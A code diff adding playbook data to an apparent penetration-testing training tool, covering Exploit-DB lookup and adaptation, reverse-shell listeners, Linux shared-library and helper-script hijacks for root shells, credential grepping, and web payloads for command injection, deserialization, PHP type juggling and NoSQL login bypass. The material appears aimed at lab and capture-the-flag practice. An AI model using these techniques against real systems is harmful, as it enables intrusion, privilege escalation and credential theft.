@@ -15246,6 +15246,459 @@
         "Forgetting to check ipconfig /all and arp -a for a second network interface on a compromised Windows host."
       ]
     }
+  ],
+  "edb-searchsploit-lookup": [
+    {
+      "when": "A scan, HTTP header, generator tag, or disclosed manifest reveals a specific version for a third-party product.",
+      "land": [
+        "Run searchsploit --exclude=\"/dos/\" against the product name and major.minor version, then paste the table back."
+      ],
+      "look": [
+        "Remote Code Execution, Command Injection, Arbitrary File Upload, Auth Bypass, SQLi, or Local Privilege Escalation rows in .py, .sh, or .txt format."
+      ],
+      "win": "obol ranks the strongest standalone PoC (demoting Metasploit-only modules and dropping DoS noise) and unlocks mirroring.",
+      "mistakes": [
+        "Searching the full patch string (e.g. 2.2.15-ubuntu3) instead of product + major.minor (e.g. product 2.2), which misses range-titled advisories."
+      ]
+    },
+    {
+      "when": "You want machine-readable Exploit-DB metadata including verified status and full paths.",
+      "land": [
+        "Run searchsploit -j for the fingerprinted product and version and paste the JSON output."
+      ],
+      "look": [
+        "RESULTS_EXPLOIT entries carrying EDB-ID, Verified, Title, and Path fields."
+      ],
+      "win": "Exact EDB-ID and local exploit path extracted automatically.",
+      "mistakes": [
+        "Firing a public PoC blindly without mirroring and reading its header and hardcoded constants first."
+      ]
+    }
+  ],
+  "edb-mirror-and-inspect": [
+    {
+      "when": "searchsploit surfaced a candidate EDB-ID and you need a writable working copy.",
+      "land": [
+        "Run searchsploit -m {{edb_id|48506}} to copy the PoC into your current working directory."
+      ],
+      "look": [
+        "Copied to: /.../48506.py confirmation line."
+      ],
+      "win": "A local copy of the PoC sits in your working folder ready to audit and edit.",
+      "mistakes": [
+        "Editing files directly inside /usr/share/exploitdb/exploits instead of mirroring a local copy with -m."
+      ]
+    },
+    {
+      "when": "Inspecting the mirrored script before sending any traffic.",
+      "land": [
+        "Read the top 80 lines with head -n 80 {{edb_file|48506.py}} and paste them into obol."
+      ],
+      "look": [
+        "CLI flags (argparse / sys.argv), hardcoded target/LHOST/LPORT variables, Python 2 print/urllib2 syntax, or 127.0.0.1:8080 debug proxies."
+      ],
+      "win": "obol extracts the script's CLI contract and flags any Python 2, proxy, or compile hazards ahead of execution.",
+      "mistakes": [
+        "Skipping inspection and letting a hardcoded 127.0.0.1:8080 Burp proxy silently blackhole the exploit."
+      ]
+    },
+    {
+      "when": "The PoC is long and argument parsing or callback variables sit near the bottom.",
+      "land": [
+        "Grep for argparse, add_argument, sys.argv, proxies, LHOST, LPORT, and target across the script."
+      ],
+      "look": [
+        "Line numbers showing every required flag, positional argument, and hardcoded constant."
+      ],
+      "win": "Every parameter that needs target adaptation is identified before launch.",
+      "mistakes": [
+        "Updating RHOST at the top of a PoC while missing a second hardcoded URL or payload IP inside main()."
+      ]
+    }
+  ],
+  "edb-run-adapted-exploit": [
+    {
+      "when": "The inspected Python PoC takes named flags (--url/-u, --lhost, --lport).",
+      "land": [
+        "Start a listener (`nc -lvnp {{lport}}`) if the PoC sends a reverse shell, then run python3 {{edb_file|exploit.py}} with the script's exact flag names."
+      ],
+      "look": [
+        "Command output (`uid=`, `whoami`) in stdout or an incoming connection on your netcat listener."
+      ],
+      "win": "You land command execution or an interactive foothold shell on the target.",
+      "mistakes": [
+        "Forgetting to include a non-root web base path (e.g. http://target/cms instead of http://target) when the app lives in a subdirectory."
+      ]
+    },
+    {
+      "when": "The inspected Python PoC reads positional arguments via sys.argv.",
+      "land": [
+        "Pass the target URL/IP, LHOST, and LPORT in the exact positional order printed by the script's Usage line."
+      ],
+      "look": [
+        "Exploit stage markers completing and a shell callback arriving on your listener."
+      ],
+      "win": "Remote code execution or reverse shell established.",
+      "mistakes": [
+        "Swapping the order of target URL and callback IP in positional sys.argv scripts."
+      ]
+    },
+    {
+      "when": "The mirrored PoC is a Bash/curl script (.sh).",
+      "land": [
+        "Run bash {{edb_file|exploit.sh}} with the target host, port, and listener arguments expected by the script."
+      ],
+      "look": [
+        "HTTP 200/302 stage responses followed by command output or reverse shell connection."
+      ],
+      "win": "Shell or remote command output returned from the target service.",
+      "mistakes": [
+        "Running a Windows-CRLF .sh PoC without stripping carriage returns first if it errors with bad interpreter."
+      ]
+    }
+  ],
+  "fix-edb-py2": [
+    {
+      "when": "A mirrored Python PoC fails (or pre-flight flags it) with Python 2 print statements, urllib2/urlparse/httplib imports, or CRLF/encoding errors.",
+      "land": [
+        "Run dos2unix, prepend `# -*- coding: utf-8 -*-`, and convert the script in place with `2to3 -w {{edb_file|exploit.py}}`."
+      ],
+      "look": [
+        "RefactoringTool: Files that were modified: {{edb_file|exploit.py}}."
+      ],
+      "win": "Python 2 print, except, raw_input, and urllib2/urlparse imports are rewritten to valid Python 3.",
+      "mistakes": [
+        "Rewriting print statements manually one line at a time while leaving urllib2 and cookielib broken."
+      ]
+    },
+    {
+      "when": "Confirming the converted script compiles cleanly and checking for Python 3 bytes/str socket calls.",
+      "land": [
+        "Run python3 -m py_compile {{edb_file|exploit.py}} and inspect `.encode()` / `urllib.request` lines."
+      ],
+      "look": [
+        "Zero syntax errors from py_compile; socket.send() or base64.b64encode() calls passing bytes (`b'...'` or `.encode()`)."
+      ],
+      "win": "The adapted PoC passes Python 3 compilation and is ready to execute.",
+      "mistakes": [
+        "Passing a Python 3 str instead of bytes (`payload.encode()`) into `socket.send()` or `base64.b64encode()`."
+      ]
+    }
+  ],
+  "fix-edb-python-deps": [
+    {
+      "when": "Running a PoC fails with `ModuleNotFoundError` (e.g. `No module named 'Crypto'`) or `pip install` fails with `error: externally-managed-environment` (PEP 668).",
+      "land": [
+        "Create `/tmp/edb-venv` with `python3 -m venv /tmp/edb-venv` and install the required libraries via `/tmp/edb-venv/bin/pip`."
+      ],
+      "look": [
+        "Successfully installed pycryptodome requests beautifulsoup4 requests-toolbelt..."
+      ],
+      "win": "An isolated Python environment holds every exploit dependency without breaking Kali's PEP 668 system packages.",
+      "mistakes": [
+        "Installing the broken legacy `crypto` or `pycrypto` package instead of `pycryptodome` when a script writes `from Crypto.Cipher import AES`."
+      ]
+    },
+    {
+      "when": "Testing the PoC inside the newly created virtual environment.",
+      "land": [
+        "Invoke the script explicitly with `/tmp/edb-venv/bin/python3 {{edb_file|exploit.py}} --help`."
+      ],
+      "look": [
+        "The PoC's help/usage banner prints with zero ImportError or ModuleNotFoundError."
+      ],
+      "win": "All third-party imports resolve cleanly and the PoC is ready to fire.",
+      "mistakes": [
+        "Running bare `python3` instead of `/tmp/edb-venv/bin/python3` after installing packages into the venv."
+      ]
+    }
+  ],
+  "fix-edb-proxy-tls": [
+    {
+      "when": "A PoC contains `proxies = {'http': 'http://127.0.0.1:8080'}` or fails with `ProxyError` / `Connection refused` to `127.0.0.1:8080`.",
+      "land": [
+        "Run sed -i to empty out hardcoded `127.0.0.1:8080` proxy dictionaries in `{{edb_file|exploit.py}}`."
+      ],
+      "look": [
+        "Hardcoded localhost proxy dictionary replaced with `proxies = {}` / `proxies=None`."
+      ],
+      "win": "HTTP traffic from the PoC goes directly to the target instead of dying on a closed local Burp listener.",
+      "mistakes": [
+        "Assuming the target port closed when `Connection refused` actually points to `127.0.0.1:8080`."
+      ]
+    },
+    {
+      "when": "An HTTPS PoC crashes with `SSLCertVerificationError` / `CERTIFICATE_VERIFY_FAILED` against a self-signed lab certificate.",
+      "land": [
+        "Re-run with `PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE=\"\"` (and add `verify=False` or `ssl._create_unverified_context()` if the script pins verification)."
+      ],
+      "look": [
+        "HTTPS handshake completes and the PoC receives the target's HTTP response."
+      ],
+      "win": "Self-signed TLS certificate verification no longer aborts the exploit.",
+      "mistakes": [
+        "Forgetting to switch `http://` to `https://` in the target URL argument when targeting SSL ports like 443 or 8443."
+      ]
+    }
+  ],
+  "fix-edb-c-compile": [
+    {
+      "when": "A C local/remote exploit fails on the target with `version GLIBC_2.34 not found`, `Exec format error`, or `gnu/stubs-32.h: No such file`.",
+      "land": [
+        "Compile on the target directly if `gcc` exists; otherwise compile statically on Kali (`-static`, plus `-m32` for 32-bit `i686` targets)."
+      ],
+      "look": [
+        "`file exploit` showing `statically linked` and matching the target's 64-bit or 32-bit ELF architecture."
+      ],
+      "win": "A portable ELF binary with zero host GLIBC version mismatch is ready to stage and run.",
+      "mistakes": [
+        "Compiling dynamically on bleeding-edge Kali and expecting the binary to run on an older Ubuntu/Debian/CentOS target."
+      ]
+    },
+    {
+      "when": "The Exploit-DB C source targets Windows (`#include <windows.h>` / `winsock2.h`).",
+      "land": [
+        "Cross-compile on Kali with `x86_64-w64-mingw32-gcc` (or `i686-w64-mingw32-gcc` for 32-bit Windows) and link `-lws2_32`."
+      ],
+      "look": [
+        "`PE32+ executable (console) x86-64, for MS Windows`."
+      ],
+      "win": "Standalone Windows `.exe` built cleanly from C source.",
+      "mistakes": [
+        "Omitting `-lws2_32` when cross-compiling Windows socket exploits with mingw."
+      ]
+    }
+  ],
+  "linux-custom-binary-triage": [
+    {
+      "when": "Enumeration flagged a non-standard SUID, sudo, capability, cron, or systemd binary outside stock OS binaries.",
+      "land": [
+        "Run `file`, `ls -la`, and `ldd` against `{{custom_bin|/opt/app/helper}}` and paste the output."
+      ],
+      "look": [
+        "SUID root ownership, writable file/directory permissions, or `=> not found` / `/opt/...` shared libraries in `ldd`."
+      ],
+      "win": "Binary architecture, privilege bits, and missing or custom shared-library dependencies are mapped.",
+      "mistakes": [
+        "Spending hours hunting kernel CVEs while a custom SUID binary in `/opt` or `/usr/local/bin` sits uninspected."
+      ]
+    },
+    {
+      "when": "Checking whether the ELF binary searches a writable RPATH or RUNPATH before system library directories.",
+      "land": [
+        "Run `readelf -d {{custom_bin|/opt/app/helper}} | grep -iE 'rpath|runpath|needed'`."
+      ],
+      "look": [
+        "`RPATH` or `RUNPATH` pointing to `/tmp`, `/var/tmp`, `$ORIGIN`, `/home/...`, or a writable `/opt/...` directory."
+      ],
+      "win": "Any hijackable ELF library search path is surfaced.",
+      "mistakes": [
+        "Only running `ldd` and missing a writable `RPATH` folder that shadows an existing library."
+      ]
+    },
+    {
+      "when": "Extracting embedded commands, script paths, and configuration references from the binary.",
+      "land": [
+        "Run `strings -n 4 {{custom_bin|/opt/app/helper}}` filtered for paths and command names, then paste the hits."
+      ],
+      "look": [
+        "Bare commands without a leading `/` (e.g. `tar -czf ...`, `service apache2 start`, `ps aux`) or custom `/opt/.../*.sh` scripts."
+      ],
+      "win": "obol detects relative PATH hijack calls or external script/library dependencies automatically.",
+      "mistakes": [
+        "Mistaking an absolute `/usr/bin/tar` call for a PATH hijack (only bare command names resolve via `$PATH`)."
+      ]
+    },
+    {
+      "when": "Observing what the binary actually executes or opens at runtime.",
+      "land": [
+        "Run `ltrace {{custom_bin|/opt/app/helper}} 2>&1 | head -n 40` (or `strace -e trace=execve,openat -f` if stripped)."
+      ],
+      "look": [
+        "`system(\"...\")`, `popen(\"...\")`, `execvp(\"...\")`, `dlopen(\"...\")`, or `ENOENT (No such file or directory)` opens."
+      ],
+      "win": "Exact runtime `system()`/`dlopen()` argument confirmed and routed to PATH or shared-object hijack.",
+      "mistakes": [
+        "Forgetting that `ltrace` drops effective SUID privileges during tracing: use `ltrace` to see the call, then run the binary normally to escalate."
+      ]
+    }
+  ],
+  "linux-shared-library-hijack": [
+    {
+      "when": "Binary triage found a missing `.so`, writable `RPATH`/`RUNPATH`, or `dlopen()` path loaded by a privileged binary.",
+      "land": [
+        "Create `/tmp/hijack.c` with an `__attribute__((constructor))` function calling `setuid(0); setgid(0); system(\"/bin/bash -p\");`."
+      ],
+      "look": [
+        "`/tmp/hijack.c` written cleanly on the target (or compiled on Kali if `gcc` is absent on-host)."
+      ],
+      "win": "Shared-object constructor source is staged.",
+      "mistakes": [
+        "Omitting `-p` on `/bin/bash -p`, causing bash to drop effective uid 0 back to your real user uid."
+      ]
+    },
+    {
+      "when": "Compiling the `.so` into the target load path and triggering the privileged binary.",
+      "land": [
+        "Compile with `gcc -shared -fPIC /tmp/hijack.c -o /path/to/hijack_target.so` and execute `{{custom_bin|/opt/app/helper}}`."
+      ],
+      "look": [
+        "`uid=0(root)` prompt spawning immediately as the dynamic linker runs your constructor."
+      ],
+      "win": "Root shell obtained via shared-object hijack.",
+      "mistakes": [
+        "Missing a required symbol version if shadowing an existing library (check `nm -D` on the original `.so` if the loader complains)."
+      ]
+    },
+    {
+      "when": "Binary triage revealed an external `.sh` or helper script at a writable or creatable path instead of a `.so`.",
+      "land": [
+        "Write a SUID-bash dropper (`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`) to the helper script path, `chmod +x` it, and run the binary."
+      ],
+      "look": [
+        "`-rwsr-xr-x 1 root root ... /tmp/rootbash` followed by `uid=0(root)` from `/tmp/rootbash -p`."
+      ],
+      "win": "Root shell obtained via privileged helper-script hijack.",
+      "mistakes": [
+        "Forgetting `#!/bin/bash` and `chmod +x` when `execve()` invokes the helper script directly without `sh`."
+      ]
+    }
+  ],
+  "windows-custom-binary-triage": [
+    {
+      "when": "Service, scheduled-task, or autorun enumeration surfaced a non-standard `.exe` outside `C:\\Windows`.",
+      "land": [
+        "Run `icacls` against both `\"{{custom_bin|C:\\Tools\\service.exe}}\"` and its parent folder."
+      ],
+      "look": [
+        "`(F)`, `(M)`, or `(W)` granted to `BUILTIN\\Users`, `Authenticated Users`, `Everyone`, or your current account."
+      ],
+      "win": "Direct binary overwrite or directory phantom-DLL write permission confirmed.",
+      "mistakes": [
+        "Checking ACLs only on the `.exe` and forgetting the parent directory (a writable folder allows phantom DLL hijacking even when the `.exe` itself is read-only)."
+      ]
+    },
+    {
+      "when": "Inspecting the Windows binary in place without dropping extra tools on the host.",
+      "land": [
+        "Run the PowerShell byte-reader one-liner to check for `mscoree.dll` (.NET) and dump embedded paths, `.dll`/`.ps1`/`.bat` calls, and connection strings."
+      ],
+      "look": [
+        "`[+] Managed .NET assembly`, hardcoded `password=` / `Data Source=`, or external `.bat`/`.ps1`/`.dll` paths."
+      ],
+      "win": "Binary runtime type (.NET vs native C/C++) and embedded secrets or child scripts extracted.",
+      "mistakes": [
+        "Running `type binary.exe` in cmd.exe, which scrambles the terminal on raw binary bytes instead of extracting printable ASCII."
+      ]
+    },
+    {
+      "when": "The custom executable is a .NET assembly or native binary that you pulled back to Kali.",
+      "land": [
+        "Decompile with `ilspycmd ./service.exe` (or run `strings -n 5`) and paste the output into obol."
+      ],
+      "look": [
+        "`Process.Start(...)` with a bare command or writable path, `[DllImport(\"custom.dll\")]`, `SqlConnection` strings, or hardcoded credentials."
+      ],
+      "win": "Full C# logic or native import bugs extracted, unlocking DLL hijack, scheduled-task/path hijack, or credential reuse.",
+      "mistakes": [
+        "Guessing what a custom `.NET` service does from black-box behavior when `ilspycmd` recovers its exact C# source in two seconds."
+      ]
+    }
+  ],
+  "web-source-sink-audit": [
+    {
+      "when": "An HTTP 500 stack trace, `phpinfo()`, LFI, or exposed backup revealed a server-side script or manifest path.",
+      "land": [
+        "Fetch `{{url}}{{source_path|/index.php}}` (or read it through your LFI wrapper) and paste the source or manifest JSON/XML."
+      ],
+      "look": [
+        "Database connectors (`mysqli_connect`, `new PDO`, `mongodb://`), pinned framework/library versions, and route handlers."
+      ],
+      "win": "obol extracts hardcoded DB credentials, JWT secrets, versioned dependencies, and vulnerable code sinks.",
+      "mistakes": [
+        "Requesting a `.php` file directly over HTTP expecting source code when you found it via LFI (use `php://filter/convert.base64-encode/resource=...` over LFI)."
+      ]
+    },
+    {
+      "when": "You dumped multiple source files (from `.git`, `.bak`/`.zip`, or directory LFI) onto Kali.",
+      "land": [
+        "Grep recursively for `mysqli_connect`, `new PDO`, `SqlConnection`, `mongodb://`, `postgres://`, `jwt.sign`, `SECRET_KEY`, and `DB_PASS`."
+      ],
+      "look": [
+        "Concrete username + password pairs and signing secrets in `.env`, `config.php`, `settings.py`, or `web.config`."
+      ],
+      "win": "Reusable database, SSH/SMB-reuse, or JWT signing credentials recovered from source.",
+      "mistakes": [
+        "Stopping at `index.php` without reading the `config.php` or `db.php` file it includes at line 2."
+      ]
+    },
+    {
+      "when": "Hunting for exploitable code execution, deserialization, or auth-bypass sinks across recovered source.",
+      "land": [
+        "Grep recursively for `shell_exec`, `system(`, `child_process`, `subprocess.`, `pickle.loads`, `yaml.load`, `unserialize(`, `strcmp(`, and `findOne(req.`."
+      ],
+      "look": [
+        "Routes passing `$_GET`/`$_POST`, `req.body`/`req.query`, or `request.args` into one of those dangerous sinks."
+      ],
+      "win": "obol mints `web.vuln_sink` with the exact sink category and unlocks targeted white-box exploitation.",
+      "mistakes": [
+        "Continuing blind directory brute-forcing after you already hold the application's source code."
+      ]
+    }
+  ],
+  "web-vuln-sink-exploit": [
+    {
+      "when": "Disclosed source passes user input into `shell_exec`, `system`, `passthru`, `child_process.exec`, `os.system`, or `subprocess(..., shell=True)`.",
+      "land": [
+        "Send a request matching the exact HTTP method and parameter name in the code with `; id` or `| id` appended."
+      ],
+      "look": [
+        "`uid=...` in the response body (or a callback on `nc -lvnp {{lport}}` / `tcpdump` if output is not echoed)."
+      ],
+      "win": "Confirmed remote command execution ready to upgrade to a reverse shell.",
+      "mistakes": [
+        "Forgetting to satisfy an outer `if (isset(...))` or prefix regex check that sits two lines above the `shell_exec` call."
+      ]
+    },
+    {
+      "when": "Disclosed source passes a cookie, header, or body field into `pickle.loads`, `yaml.load`, PHP `unserialize`, or `node-serialize`.",
+      "land": [
+        "Generate a serialized payload matching the language runtime and encoding (e.g. base64 pickle `__reduce__`, PyYAML `!!python/object/apply`, or `node-serialize` IIFE) and submit it."
+      ],
+      "look": [
+        "Incoming reverse shell on `nc -lvnp {{lport}}` or command output returned in the HTTP response."
+      ],
+      "win": "Remote code execution achieved through white-box deserialization.",
+      "mistakes": [
+        "Sending raw binary pickle bytes when the source calls `pickle.loads(base64.b64decode(cookie))` (match the exact wrapper chain in the code)."
+      ]
+    },
+    {
+      "when": "Disclosed PHP source checks a login or token with `strcmp($_POST['password'], $secret) == 0` or loose `==` / `md5() ==`.",
+      "land": [
+        "Send `password[]=` (an empty array) against `strcmp() == 0`, or a magic `0e...` string when loose `==` compares `0e` hashes."
+      ],
+      "look": [
+        "`302 Found` redirect with `Set-Cookie` session or authenticated admin dashboard HTML."
+      ],
+      "win": "Authentication bypassed cleanly via PHP type juggling (`web.authz_bypass`).",
+      "mistakes": [
+        "Trying `password[]=` on PHP 8.0+ where `strcmp(array, string)` throws a fatal `TypeError` instead of returning `NULL` (check the PHP version in headers first)."
+      ]
+    },
+    {
+      "when": "Disclosed Node/Express source passes `req.body` or `req.query` directly into MongoDB `.find()` / `.findOne()`.",
+      "land": [
+        "Send `Content-Type: application/json` with `{\"username\":\"admin\",\"password\":{\"$ne\":null}}` to the login route."
+      ],
+      "look": [
+        "Authenticated JWT/session cookie or redirect into the admin interface."
+      ],
+      "win": "NoSQL operator injection bypasses login without knowing the password.",
+      "mistakes": [
+        "Sending JSON operators with default `application/x-www-form-urlencoded` headers when the Express app parses JSON via `express.json()`."
+      ]
+    }
   ]
 };
 
@@ -15368,6 +15821,18 @@
     'rpc-endpoint-abuse': { what: 'MSRPC on port 135 and 445 advertises internal Windows services, dynamic ports, and user accounts. Dumping the endpoint mapper and querying SAMR/LSARPC surfaces coercion targets and domain usernames.' },
     'fix-samr-null-denied': { what: 'Modern Windows servers block anonymous SAMR user listings (NT_STATUS_ACCESS_DENIED) even when SMB connects. Pivoting to Guest RID brute-forcing, LSARPC SID lookups, or an authenticated session bypasses that block and recovers the user list.' },
     'post-proof-loot-sweep': { what: 'Capturing the flag proves you owned this box, but credentials and network routes on it are how you reach the rest of the network. This post-proof sweep collects hashes, keys, and internal interfaces before you move on.' },
+    'edb-searchsploit-lookup': { what: 'When a banner or manifest reveals a specific version of a third-party app (not stock Apache or OpenSSH), you check Exploit-DB offline with searchsploit to see if a public RCE, auth-bypass, or file-read PoC already exists for that build.' },
+    'edb-mirror-and-inspect': { what: 'Public exploit scripts break constantly if you fire them blind. Mirroring a local copy and reading its top lines tells you what flags it takes, what hardcoded IPs or Burp proxies need changing, and whether it was written for Python 2.' },
+    'edb-run-adapted-exploit': { what: 'Once the mirrored Exploit-DB script is adapted to your target URL, listener IP/port, and Python runtime, you execute it with a listener ready to catch the foothold shell.' },
+    'fix-edb-py2': { what: 'Hundreds of working Exploit-DB scripts were written for Python 2 and crash on Python 3 over print parentheses or urllib2 imports. Converting the script with dos2unix and 2to3 gets a valid exploit running in seconds.' },
+    'fix-edb-python-deps': { what: 'Modern Kali blocks global pip installs (PEP 668), and PoCs often need pycryptodome or requests-toolbelt. Spinning up a quick venv in /tmp/edb-venv installs the missing library cleanly so the exploit runs.' },
+    'fix-edb-proxy-tls': { what: 'Exploit authors often leave a 127.0.0.1:8080 Burp proxy hardcoded in their script, or forget verify=False for self-signed HTTPS certs. Stripping the proxy and TLS verification unblocks the request.' },
+    'fix-edb-c-compile': { what: 'A C exploit compiled on modern Kali often fails on older targets due to GLIBC version mismatches or 32-bit/64-bit differences. Static linking (-static), -m32, or mingw cross-compilation produces a binary the target can actually run.' },
+    'linux-custom-binary-triage': { what: 'A non-standard SUID, sudo, or cron binary outside the normal OS baseline is almost always custom code with a bug. Running file, ldd, readelf, strings, and ltrace exposes bare command calls (PATH hijack) and missing or writable shared libraries.' },
+    'linux-shared-library-hijack': { what: 'When a privileged Linux binary loads a shared library from a missing or writable RPATH/dlopen path (or runs a writable helper script), planting your own .so constructor or script executes your payload as root.' },
+    'windows-custom-binary-triage': { what: 'A non-default Windows service or scheduled-task executable outside C:\\Windows deserves immediate inspection: check its file/folder ACLs with icacls, pull embedded strings, and decompile .NET assemblies with ilspycmd to uncover writable paths, phantom DLLs, or hardcoded passwords.' },
+    'web-source-sink-audit': { what: 'Once an error trace, LFI, .git leak, or exposed manifest hands you server-side code, you stop guessing blind and read the code: extract database/JWT credentials and locate dangerous command, deserialization, type-juggling, or NoSQL sinks.' },
+    'web-vuln-sink-exploit': { what: 'With the exact vulnerable sink visible in source code, you send one surgical payload tailored to that function (command injection, serialized gadget, PHP strcmp array bypass, or JSON NoSQL operator) for a shell or admin login.' },
   };
 
   // "Once You Are In": the first-breath orientation commands a learner needs the moment a shell lands and
@@ -15421,6 +15886,14 @@
     'blocker.tls_scheme': { title: 'TLS / HTTPS Scheme Mismatch or Self-Signed Cert', why: 'You spoke plain HTTP to an HTTPS port (400 Bad Request: plain HTTP request was sent to HTTPS port) or TLS verification rejected a self-signed certificate.', body: 'Switch the URL scheme to https:// and pass -k (curl) or -mc all to ignore self-signed certificate errors, and add the certificate CN/SAN to /etc/hosts.', code: 'curl -skI https://<target>/' },
     'blocker.access_denied': { title: 'Access Denied (Insufficient Privileges)', why: 'The operation was refused with Access is denied / Permission denied / EACCES.', body: 'Your current account or integrity level lacks the required ACL or privilege. On Windows, check if you are a filtered local admin needing UAC bypass (whoami /groups) or missing a token privilege (whoami /priv); on Linux, check sudo -l, group memberships (id), and file ownership.', code: 'whoami /groups & whoami /priv' },
     'blocker.samr_null_denied': { title: 'SAMR Null Session Denied (RestrictAnonymousSAM)', why: 'Anonymous SMB connected, but SAMR user enumeration (enumdomusers / --users) returned NT_STATUS_ACCESS_DENIED.', body: 'Modern Windows hosts block anonymous SAMR queries by default. Pivot to Guest RID cycling (--rid-brute), LSARPC SID lookups (lsaenumsid / lookupsid), or authenticate with a discovered credential.', code: "nxc smb <target> -u 'guest' -p '' --rid-brute" },
+    'exploit.hazard_py2': { title: 'Pre-Flight Hazard: Legacy Python 2 Exploit Syntax Detected', why: 'Static inspection spotted Python 2 print statements, raw_input(), or removed stdlib modules (urllib2, cookielib, urlparse, httplib) that will crash under Python 3.', body: 'Normalize CRLF line endings, insert a UTF-8 coding header for non-ASCII author comments, and convert the script in place with 2to3 -w before executing it.', code: "dos2unix {{edb_file|exploit.py}} 2>/dev/null; sed -i '1i # -*- coding: utf-8 -*-' {{edb_file|exploit.py}} && 2to3 -w {{edb_file|exploit.py}}" },
+    'exploit.hazard_burp_proxy': { title: 'Pre-Flight Hazard: Hardcoded Localhost Burp Proxy (127.0.0.1:8080)', why: 'The mirrored PoC contains an active proxies = {... 127.0.0.1:8080 ...} setting left behind by the exploit author, which will fail with ProxyError if Burp Suite is closed.', body: 'Clear the hardcoded proxy dictionary in your local PoC copy (or start Burp on 127.0.0.1:8080 to intercept the exploit traffic) before firing.', code: "sed -i -E \"s/proxies\\s*=\\s*\\{[^}]*127\\.0\\.0\\.1:(8080|8081|8000|8888)[^}]*\\}/proxies = {}/g\" {{edb_file|exploit.py}}" },
+    'exploit.hazard_c_compile': { title: 'Pre-Flight Hazard: C / C++ Exploit Requires Matched Compilation', why: 'This Exploit-DB entry is raw C/C++ source code that must be compiled for the target OS, architecture, and libc version before running.', body: 'Compile on the target when gcc is present, or link statically (-static) on Kali so host GLIBC version skew does not break execution on older targets.', code: 'gcc {{edb_file|exploit.c}} -o exploit_bin -static -pthread || gcc -m32 {{edb_file|exploit.c}} -o exploit32 -static' },
+    'blocker.py2_syntax_or_module': { title: 'Python 2 Exploit Syntax or Module Under Python 3', why: 'The PoC crashed with Missing parentheses in call to print, No module named urllib2/urlparse/httplib/cookielib, or a Python 3 str/bytes TypeError.', body: 'Convert the legacy Python 2 Exploit-DB script in place with dos2unix + 2to3 -w (and prepend a UTF-8 coding header), or invoke it with python2 if installed. Check socket.send() and base64 calls for bytes (.encode()).', code: "dos2unix {{edb_file|exploit.py}}; sed -i '1i # -*- coding: utf-8 -*-' {{edb_file|exploit.py}} && 2to3 -w {{edb_file|exploit.py}}" },
+    'blocker.python_dep_or_pep668': { title: 'Missing Python Dependency or PEP 668 pip Block', why: 'The PoC raised ModuleNotFoundError (e.g. Crypto, requests_toolbelt, bs4, pwn) or pip failed with externally-managed-environment (PEP 668).', body: 'Create an isolated virtual environment in /tmp/edb-venv and install the missing package there (use pycryptodome whenever a script imports Crypto), then run the exploit with /tmp/edb-venv/bin/python3.', code: 'python3 -m venv /tmp/edb-venv && /tmp/edb-venv/bin/pip install pycryptodome requests beautifulsoup4 requests-toolbelt && /tmp/edb-venv/bin/python3 {{edb_file|exploit.py}}' },
+    'blocker.hardcoded_proxy': { title: 'Hardcoded Localhost Debug Proxy (127.0.0.1:8080)', why: 'ProxyError / Connection refused to 127.0.0.1:8080: the exploit author left a local Burp Suite proxy hardcoded in the script.', body: 'Strip or empty the proxies = {...} dictionary in the PoC (or start Burp on 127.0.0.1:8080 if you want to inspect the traffic) and re-run.', code: "sed -i -E \"s/proxies\\s*=\\s*\\{[^}]*127\\.0\\.0\\.1:(8080|8000|8888)[^}]*\\}/proxies = {}/g\" {{edb_file|exploit.py}}" },
+    'blocker.tls_cert_verify': { title: 'Self-Signed TLS Certificate Verification Failed', why: 'SSLCertVerificationError / CERTIFICATE_VERIFY_FAILED: the PoC rejected the target self-signed lab HTTPS certificate.', body: 'Run with PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE=\"\", or add verify=False to requests.get/post (or ssl._create_unverified_context() for urllib) in the local PoC copy.', code: 'PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE="" python3 -W ignore {{edb_file|exploit.py}}' },
+    'blocker.glibc_or_arch_mismatch': { title: 'Compiled Binary GLIBC, Architecture, or Header Mismatch', why: 'The compiled C exploit failed with version GLIBC_2.3x not found, Exec format error, cannot open shared object file, or fatal error: gnu/stubs-32.h.', body: 'Compile directly on the target if gcc is available; otherwise link statically (-static), pass -m32 (with gcc-multilib installed) for 32-bit targets, or cross-compile Windows .c exploits with x86_64-w64-mingw32-gcc.', code: 'gcc {{edb_file|exploit.c}} -o exploit -static -pthread || gcc -m32 {{edb_file|exploit.c}} -o exploit32 -static' },
   };
 
   // Resolve a (move, command index) to a canvas note, with a graceful fallback to the pack's own command
